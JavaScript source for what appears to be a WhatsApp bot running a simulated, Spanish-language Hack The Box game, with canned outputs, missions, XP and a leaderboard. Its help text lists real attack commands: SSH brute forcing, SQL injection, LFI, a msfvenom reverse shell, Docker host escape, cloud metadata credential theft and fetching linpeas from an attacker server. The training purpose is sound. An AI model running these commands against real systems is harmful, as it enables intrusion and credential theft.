      return `HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\n    DefaultUserName    REG_SZ    ${mission.user}\n    DefaultPassword    REG_SZ    ${mission.userPass}  ← ¡Autologon en texto plano!\n\n🔑 ¡Credenciales en registro! ${mission.user}:${mission.userPass}`;
    }
    if (trimmed.includes('unattend') || trimmed.includes('sysprep')) {
      mission.state.foundCreds = true;
      return `HKLM\\..\\Unattend.xml\n    password: ${mission.userPass}  ← Unattended install creds!\n🔑 Credenciales de instalación encontradas.`;
    }
    return `reg query ${parts.slice(2).join(' ')}\n(sin resultados interesantes)`;
  }

  // icacls — permisos Windows
  if (command === 'icacls') {
    if (!mission.state.ssh || mission.category !== 'Windows') return `❌ icacls: necesitas shell en host Windows.`;
    const target = parts[1] || 'C:\\';
    if (target.includes('scripts') || target.includes('backup') || target.includes('opt')) {
      return `icacls ${target}\n${mission.user}:(OI)(CI)(F)  ← escritura para ${mission.user}!\nSYSTEM:(OI)(CI)(F)\nAdministrators:(OI)(CI)(F)\n\n💡 Tienes escritura total en ${target} — inyecta un payload aquí.`;
    }
    return `icacls ${target}\nSYSTEM:(OI)(CI)(F)\nAdministrators:(OI)(CI)(F)\n${mission.user}:(R)  ← solo lectura`;
  }

  // PrintSpoofer / JuicyPotato
  if (trimmed.includes('printspoofer') || trimmed.includes('juicypotato') || trimmed.includes('godpotato') || trimmed.includes('sweetpotato')) {
    if (!mission.state.ssh) return `❌ Necesitas shell primero.`;
    if (mission.category !== 'Windows') return `❌ Potato exploits son para Windows. Esta máquina es ${mission.category}.`;
    mission.state.privesc = true;
    return `[+] Found privilege: SeImpersonatePrivilege\n[+] Named pipe listening...\n[+] CreateProcessAsUser() OK\nnt authority\\system\n${'─'.repeat(40)}\n👑 ¡SYSTEM obtenido via ${trimmed.includes('printspoofer') ? 'PrintSpoofer' : 'JuicyPotato/GodPotato'}!\n🚩 cat C:\\Users\\Administrator\\Desktop\\root.txt`;
  }

  // ══════════════════════════════════════════════════════════════════════
  // 15. HELP CONTEXTUAL
  // ══════════════════════════════════════════════════════════════════════

  if (command === 'help' || command === '?' || command === 'commands') {
    const specificTip = {
      ssh:       '💡 Flujo: nmap → hydra → ssh → user.txt → sudo -l → root.txt',
      web:       '💡 Flujo: nmap → ffuf/gobuster → curl (LFI) → shell → linpeas → root',
      ftp:       '💡 Flujo: nmap → ftp anonymous@ → cat credentials.txt → ssh → sudo -l',
      smb:       '💡 Flujo: nmap → enum4linux → smbclient → credenciales → evil-winrm',
      sqli:      '💡 Flujo: nmap → ffuf → sqlmap -u http://... --dbs → shell → privesc',
      wordpress: '💡 Flujo: nmap → wpscan --passwords → wp-admin → shell → linpeas',
      ad:        '💡 Flujo: nmap → bloodhound → impacket-GetUserSPNs → hashcat → evil-winrm',
      docker:    '💡 Flujo: nmap → docker -H tcp://IP:2375 ps → docker run -v /:/mnt ... chroot /mnt sh',
      api:       '💡 Flujo: nmap → ffuf → curl /api/v1 → msfconsole (Spring4Shell) → root',
      cloud:     '💡 Flujo: nmap → curl http://169.254.169.254/... → AWS creds → aws iam ...',
      kernel:    '💡 Flujo: nmap → ssh (creds por defecto) → uname -a → DirtyCOW/DirtyPipe → root',
      binary:    '💡 Flujo: nmap → nc IP 1337 → desbordamiento → msfvenom payload → root',
      crypto:    '💡 Flujo: nmap → curl https://IP:9000 → análisis cipher → padding oracle → root',
      fullchain: '💡 Flujo: nmap → ffuf → SSRF → Redis RCE → docker socket → root',
      apt:       '💡 Flujo: nmap → enum DNS → curl C2 → bloodhound → secretsdump → DA',
    };

    return `📚 COMANDOS HTB (simulación realista)
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
🔍 RECON:
   nmap [-sV -sC -A -O -p-] <ip>
   masscan / rustscan <ip>

📋 ENUMERACIÓN WEB:
   gobuster | ffuf | dirb | nikto | dirsearch
   curl <url>  (LFI: ?file=../../etc/passwd)
   wpscan [--passwords rockyou.txt]
   
📋 ENUMERACIÓN SMB/AD:
   enum4linux | smbclient | ldapsearch
   bloodhound | kerbrute | crackmapexec

📋 ENUMERACIÓN FTP:
   ftp anonymous@<ip>

💥 EXPLOTACIÓN:
   hydra -l user -P rockyou.txt ssh://<ip>
   sqlmap -u "http://<ip>/page.php?id=1" --dbs
   searchsploit <servicio>
   msfconsole → search/use/set/run
   msfvenom -p linux/x64/shell_reverse_tcp ...
   nc -lvnp <port>  |  nc <ip> 1337
   impacket-GetUserSPNs | impacket-psexec
   docker -H tcp://<ip>:2375 ps
   jwt decode/forge
   base64 -d | openssl enc -d
   aws s3 ls | aws iam list-users
   redis-cli -h 127.0.0.1
   strings | gdb | ghidra ./bin

⬆️ ESCALADA:
   sudo -l       find / -perm -4000 -2>/dev/null
   linpeas / winpeas / pspy64
   crontab -l    ps aux    netstat -tulpn
   grep -r 'pass' /var/www/html/
   env           john | hashcat
   DirtyCOW | DirtyPipe | Polkit | PrintSpoofer
   whoami /priv  reg query | icacls (Windows)
   proxychains | chisel (pivoting)
   redis-cli CONFIG SET (post-Redis RCE)

🖥️ SHELL:
   whoami | id | uname -a | hostname
   ls [-la] | cat | head | tail | grep
   echo 'text' > file  (VFS persistente)
   python3 -c 'import pty;pty.spawn("/bin/bash")'
   wget http://10.10.14.1:8000/linpeas.sh
   python3 -m http.server 8080

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
${specificTip[t] || '💡 Flujo: nmap → enumerar → credenciales → shell → privesc → root'}
⚠️  TODO SIMULADO — output realista contextual por máquina`;
  }

  return `❌ Comando '${command}' no reconocido.\n💡 Usa 'help' para ver todos los comandos disponibles.\n💡 Tip para misión ${mission.name} (${t}): ${cveMap[t] || 'enumera con nmap primero'}`;
}

function completeMission(session, mission) {
  if (!mission.state.userFlag || !mission.state.rootFlag) return false;
  if (mission.completed) return false;

  mission.completed = true;
  session.completed += 1;
  const gain = DIFFICULTY[mission.difficulty].xp;
  session.xp += gain;
  session.current = Math.min(TOTAL_MACHINES, session.current + 1);
  
  // Achievements
  checkAchievements(session, mission);
  
  return gain;
}

function checkAchievements(session, mission) {
  const achievements = {
    first_blood:    { name: '🩸 First Blood',      cond: () => session.completed === 1 },
    ten_pwned:      { name: '🔟 Decimal',          cond: () => session.completed === 10 },
    fifty_pwned:    { name: '5️⃣0️⃣ Half Century',    cond: () => session.completed === 50 },
    century:        { name: '💯 Centurion',        cond: () => session.completed === 100 },
    two_hundred:    { name: '🏅 Double Century',   cond: () => session.completed === 200 },
    completionist:  { name: '👑 Completionist',    cond: () => session.completed === 300 },
    insano_pwned:   { name: '💀 Insanity',         cond: () => mission.difficulty === 'insano' },
    speedrunner:    { name: '⚡ Speedrunner',      cond: () => (Date.now() - session.startedAt) < 3600000 && session.completed >= 10 },
    no_hints:       { name: '🧠 Big Brain',        cond: () => session.completed >= 50 && session.cheats === 0 }
  };
  
  for (const [key, ach] of Object.entries(achievements)) {
    if (!session.achievements.has(key) && ach.cond()) {
      session.achievements.add(key);
    }
  }
}

function buildStatus(session) {
  const rank = getRank(session.xp);
  const pct = Math.floor((session.completed / TOTAL_MACHINES) * 100);
  const progressBar = '█'.repeat(Math.floor(pct / 5)) + '░'.repeat(20 - Math.floor(pct / 5));
  
  let status = `
╔══════════════════════════════════════╗
║     🏴‍☠️  HTB PLAYER STATS  🏴‍☠️         ║
╠══════════════════════════════════════╣
║  ${rank.badge} Rango: ${rank.name.padEnd(20)}    ║
║  ⭐ XP: ${String(session.xp).padEnd(6)} / 9000               ║
║  🎯 Misiones: ${session.completed}/${TOTAL_MACHINES} (${pct}%)            ║
║  [${progressBar}]  ║
║  ➡️  Siguiente: Misión ${session.current}              ║
╚══════════════════════════════════════╝`;
  
  // Mostrar achievements
  if (session.achievements.size > 0) {
    status += `\n\n🏆 ACHIEVEMENTS: ${[...session.achievements].map(a => {
      const names = {
        first_blood: '🩸', ten_pwned: '🔟', fifty_pwned: '5️⃣0️⃣', 
        century: '💯', two_hundred: '🏅', completionist: '👑',
        insano_pwned: '💀', speedrunner: '⚡', no_hints: '🧠'
      };
      return names[a] || '🎖️';
    }).join(' ')}`;
  }
  
  return status;
}

function buildLeaderboard(sessions) {
  const entries = [...sessions.entries()]
    .map(([chatId, s]) => ({ chatId, xp: s.xp, completed: s.completed, rank: getRank(s.xp) }))
    .sort((a, b) => b.xp - a.xp)
    .slice(0, 10);
  
  if (entries.length === 0) return '📊 No hay jugadores registrados aún.';
  
  let board = `\n╔══════ 🏆 HTB LEADERBOARD 🏆 ══════╗\n`;
  entries.forEach((e, i) => {
    const medal = i === 0 ? '🥇' : i === 1 ? '🥈' : i === 2 ? '🥉' : `${i + 1}.`;
    const shortId = e.chatId.split('@')[0].slice(-4);
    board += `║ ${medal} ...${shortId} | ${e.rank.badge} ${e.xp}xp | ${e.completed} pwned\n`;
  });
  board += `╚════════════════════════════════════╝`;
  return board;
}

export async function handleHackTheBox(sock, msg) {
  const chatId = msg.key.remoteJid;
  const rawText = (msg.message?.conversation || msg.message?.extendedTextMessage?.text || '').trim();
  const session = getSession(chatId);
  const parts = rawText.split(/\s+/).slice(1);
  const command = parts.join(' ').trim();

  session.history.push(rawText);
  const sub = parts[0]?.toLowerCase();

  // ═══════════════════════════════════════════════════════════════════════
  // COMANDOS DEL JUEGO
  // ═══════════════════════════════════════════════════════════════════════

  if (!sub || ['help', 'ayuda', 'man', 'h'].includes(sub)) {
    const rank = getRank(session.xp);
    return `
╔════════════════════════════════════════╗
║  🏴‍☠️  HACK THE BOX - 300 MÁQUINAS  🏴‍☠️   ║
║         Coded by C3rb3rus-666          ║
╠════════════════════════════════════════╣
║  !htb start [#]  → Iniciar misión      ║
║  !htb mission    → Ver misión actual   ║
║  !htb run <cmd>  → Ejecutar comando    ║
║  !htb status     → Tu progreso/rango   ║
║  !htb list       → Listar máquinas     ║
║  !htb jump <#>   → Saltar a misión #   ║
║  !htb top        → Leaderboard         ║
║  !htb reset      → Reiniciar progreso  ║
╠════════════════════════════════════════╣
║  📊 Tu rango: ${rank.badge} ${rank.name.padEnd(18)}    ║
║  🎯 Progreso: ${session.completed}/${TOTAL_MACHINES} máquinas pwned     ║
╚════════════════════════════════════════╝

💡 Tip: usa '!htb run help' para ver comandos de hacking`;
  }

  if (sub === 'status' || sub === 'stats') {
    return buildStatus(session);
  }

  if (sub === 'top' || sub === 'leaderboard' || sub === 'lb') {
    return buildLeaderboard(sessions);
  }

  if (sub === 'mission' || sub === 'info' || sub === 'm') {
    const mission = startMission(session);
    return formatMissionInfo(mission) + '\n\n' + missionStatusText(session, mission);
  }

  if (sub === 'list' || sub === 'machines') {
    const page = parseInt(parts[1], 10) || 1;
    const perPage = 15;
    const start = (page - 1) * perPage;
    const end = Math.min(start + perPage, TOTAL_MACHINES);
    const totalPages = Math.ceil(TOTAL_MACHINES / perPage);
    
    let list = `📋 MÁQUINAS (Página ${page}/${totalPages}):\n${'─'.repeat(40)}\n`;
    for (let i = start; i < end; i++) {
      const m = ALL_MISSIONS[i];
      const diff = DIFFICULTY[m.difficulty];
      const done = session.missions.get(m.id)?.completed ? '✅' : '⬜';
      list += `${done} ${String(m.id).padStart(3)}. ${m.name.padEnd(15)} ${diff.color} ${m.category}\n`;
    }
    list += `${'─'.repeat(40)}\n📖 Usa !htb list <página> para más`;
    return list;
  }

  if (sub === 'start' || sub === 's') {
    const desired = parseInt(parts[1], 10);
    if (!isNaN(desired) && desired >= 1 && desired <= TOTAL_MACHINES) {
      session.current = desired;
    }
    const mission = startMission(session);
    return '🚀 Misión cargada:\n' + formatMissionInfo(mission) + '\n' + missionIntro(mission);
  }

  if (sub === 'jump' || sub === 'goto' || sub === 'j') {
    const target = parseInt(parts[1], 10);
    if (isNaN(target) || target < 1 || target > TOTAL_MACHINES) {
      return `❌ Uso: !htb jump <1-${TOTAL_MACHINES}>`;
    }
    session.current = target;
    const mission = startMission(session);
    return `⏭️ Saltando a misión ${target}...\n\n` + formatMissionInfo(mission);
  }

  if (sub === 'run' || sub === 'exec' || sub === 'r' || sub === '$') {
    const mission = startMission(session);
    if (!mission) return '❌ No hay misión activa. Usa !htb start';
    const cmd = parts.slice(1).join(' ').trim();
    if (!cmd) return '❌ Uso: !htb run <comando>\nEjemplo: !htb run nmap ' + mission.ip;

    const out = evalCommand(session, mission, cmd, chatId);
    const gain = completeMission(session, mission);
    
    let message = out + '\n\n' + missionStatusText(session, mission);
    
    if (gain) {
      const rank = getRank(session.xp);
      message += `\n\n${'═'.repeat(40)}`;
      message += `\n🎉 ¡MISIÓN ${mission.id} [${mission.name}] COMPLETADA!`;
      message += `\n+${gain} XP | Total: ${session.xp} XP`;
      message += `\n${rank.badge} Rango: ${rank.name}`;
      message += `\n📊 Progreso: ${session.completed}/${TOTAL_MACHINES}`;
      message += `\n${'═'.repeat(40)}`;
      message += `\n\n➡️ Siguiente misión: !htb start`;
    }
    return message;
  }

  if (sub === 'reset' || sub === 'restart') {
    sessions.delete(chatId);
    return `🔄 Sesión HTB reiniciada completamente.\nTodo tu progreso ha sido borrado.\nUsa !htb start para comenzar de nuevo.`;
  }

  if (sub === 'hint' || sub === 'pista') {
    const mission = startMission(session);
    session.cheats++;
    return `💡 HINT para ${mission.name}:\n${'─'.repeat(40)}\n${mission.hint}\n\n🎯 Vector: ${mission.vector}\n📍 Busca: ${mission.user}:${mission.userPass.slice(0, 3)}***`;
  }

  return '❌ Subcomando no reconocido. Usa !htb help para ver opciones.';
}
